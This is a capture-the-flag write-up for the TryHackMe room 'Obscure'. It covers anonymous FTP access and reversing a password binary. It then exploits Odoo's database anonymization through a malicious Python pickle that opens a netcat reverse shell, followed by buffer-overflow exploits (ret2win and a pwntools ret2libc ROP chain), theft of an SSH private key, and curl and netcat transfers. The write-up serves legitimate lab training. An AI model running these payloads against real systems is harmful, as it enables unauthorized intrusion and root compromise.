# Obscure

**Room Link:** [https://tryhackme.com/r/room/obscured](https://tryhackme.com/r/room/obscured)



## **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1053).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1054).png" alt=""><figcaption></figcaption></figure>



## **TCP/21 - FTP**

**Kali**

```
ftp $VICTIM 21
Username: anonymous
```



**Kali(ftp)**

```
binary
passive
cd pub
mget *
```

<figure><img src="../../.gitbook/assets/image (1055).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1056).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo $VICTIM antisoft.thm >> /etc/hosts
cat /etc/hosts
```



We find a function that checks if the password is equal to 971234596, if it is the program gives us the password.

**Kali**

```
ghidra
```

<figure><img src="../../.gitbook/assets/image (1057).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
chmod +x password 
./password
971234596
```

<figure><img src="../../.gitbook/assets/image (1058).png" alt=""><figcaption></figcaption></figure>

**Login Credentials**

```
Username: admin@antisoft.thm
Password: SecurePassword123!
```

## Initial Shell <a href="#find-pages" id="find-pages"></a>

exploit: [https://www.exploit-db.com/exploits/44064](https://www.exploit-db.com/exploits/44064)

In order to exploit the vulnerability, you should navigate to the Apps page (the link is in the navigation bar at the top and search for and install Database Anonymization in the search bar. We have to deselect the Apps filter in the search bar for it to show up.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Install Database Anonymization&#x20;

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Once we have the module installed, we navigate to the settings page and select Anonymize database  under Database anonymization and click on the Anonymize Database button.&#x20;

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**exploit.py**

```
import cPickle
import os
import base64
import pickletools

class Exploit(object):
	def __reduce__(self):
		return (os.system, (("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $KALI 1337 >/tmp/f"),))
	

with open("exploit.pickle", "wb") as f:
	cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

**Kali**

```
python2.7 exploit.py
nc -lvnp 1337
```

Next, we refresh the page and navigate to the same page under settings. We upload the exploit.pickle file generated our script and click on Reverse the Database Anonymization button. We should have a reverse shell.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
script -qc /bin/bash /dev/null
ctrl + Z
stty raw -echo;fg
```



<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Netcat <a href="#netcat" id="netcat"></a>

**Kali(receiving)**

```
nc -l -p 1234 > ret
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < ret
```

## Lateral Movement #1 <a href="#find-pages" id="find-pages"></a>

**Kali**

```
ghidra
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
cyclic 256
```

**Kali**

```
gdb ret
```

**Kali(gdb)**

```
r
```

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

This tells us it crashes after 136 characters

**Kali**

```
cyclic -l 0x6261616a
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

We see the win function is located at 0x400646

**Kali**

```
objdump -t ret
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

Confirmed it crashes after 136.

**Kali**

```
python -c 'print("A"* 137)' | ./ret 
```

<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

I wanted to confirm it would crash where we expected so I added the program into a for loop

**payload.py - version 2**&#x20;

```
from pwn import *
import subprocess

for i in range(130, 140):
	payload = b'A'*i + p64(0x400646)
	print ("Current value: " + str(i))

	f = open('/root/payload.bin', 'wb')
	f.write(payload)
	f.close
	os.system("(cat payload.bin; cat) | ./ret")
```

We can see 137 did work on our local box and got us to the win function when adding it's address to the script

**Kali**

```
python payload.py 
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Now to create our payload and send it to the victim

**payload.py - version 2**&#x20;

```
from pwn import *

payload = b'A'*136 + p64(0x400646)

f = open('/root/payload.bin', 'wb')
f.write(payload)
f.close
```

Testing that the payload still works on our local machine.

**Kali**

```
(cat payload.bin; cat) | ./ret
```

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
python2 -m SimpleHTTPServer 82
```

We are root but only within the docker container.

**Victim**

```
cd /tmp
curl http://$KALI:82/payload.bin -o payload.bin
(cat payload.bin; cat) | /ret
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

## Lateral Movement #2 <a href="#find-pages" id="find-pages"></a>

**Victim(root)**

```
ip a
nmap 172.17.0.1
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

**Victim(root)**

```
(cat payload.bin; cat) | nc 172.17.0.1 4444 
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Victim(zeeshan)**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
cat /home/zeeshan/.ssh/id_rsa
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

id\_rsa has no password so we can just login without cracking it

**Kali**

```
chmod 600 id_rsa
/opt/john/ssh2john.py id_rsa > id_john.txt
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Privilege Escalation**&#x20;

**Kali**

```
scp -i id_rsa zeeshan@$VICTIM:/exploit_me /root/exploit_me
ghidra
```

### &#x20;<a href="#netcat" id="netcat"></a>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
checksec exploit_me
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
cyclic 256
```

**Kali**

```
gdb exploit_me
```

**Kali(gdb)**

```
r
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali(gdb)**

```
x $rsp
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
cyclic -l 0x6161616b
```

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

### &#x20;<a href="#netcat" id="netcat"></a>

**final.py**

```
from pwn import *

elf = ELF('/root/exploit_me')
elf.address = 0x400000
context.binary = elf
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP([elf])
PUTS_PLT = elf.plt['puts'] 
MAIN_PLT = elf.symbols['main']
PUTS_GOT = elf.got['puts']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

r = process('/root/exploit_me')

payload = cyclic(40) +   p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

r.sendlineafter('Exploit this binary for root!\n', payload)
leak = int.from_bytes(r.read(6), 'little')
libc.address = leak - libc.symbols['puts'] 
print(hex(leak))

BINSH = next(libc.search(b'/bin/sh')) 
SYSTEM = libc.sym['system']
EXIT = libc.sym['exit']

rop = ROP([libc])
rop.execve(BINSH, 0, 0)
print(rop.dump())
payload = cyclic(40) + rop.chain()

r.sendlineafter('Exploit this binary for root!\n', payload)

r.interactive()
```

**Kali**

```
python final.py
```

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
ldd /exploit_me 
```

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
scp -i id_rsa zeeshan@$VICTIM:/lib/x86_64-linux-gnu/libc.so.6 /root/
libc.so.6  
```



**final.py - version 2**

```
from pwn import *

elf = ELF('/root/exploit_me')
elf.address = 0x400000
context.binary = elf
libc = ELF('/root/libc.so.6')
rop = ROP([elf])
PUTS_PLT = elf.plt['puts'] 
MAIN_PLT = elf.symbols['main']
PUTS_GOT = elf.got['puts']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

s = ssh(user='zeeshan', host='10.10.159.46', keyfile='/root/id_rsa')
r = s.process('/./exploit_me')

payload = cyclic(40) +   p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

r.sendlineafter('Exploit this binary for root!\n', payload)
leak = int.from_bytes(r.read(6), 'little')
libc.address = leak - libc.symbols['puts'] 
print(hex(leak))

BINSH = next(libc.search(b'/bin/sh')) 
SYSTEM = libc.sym['system']
EXIT = libc.sym['exit']

rop = ROP([libc])
rop.execve(BINSH, 0, 0)
print(rop.dump())
payload = cyclic(40) + rop.chain()

r.sendlineafter('Exploit this binary for root!\n', payload)

r.interactive()
```

**Kali**

```
python3 final.py
```

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>



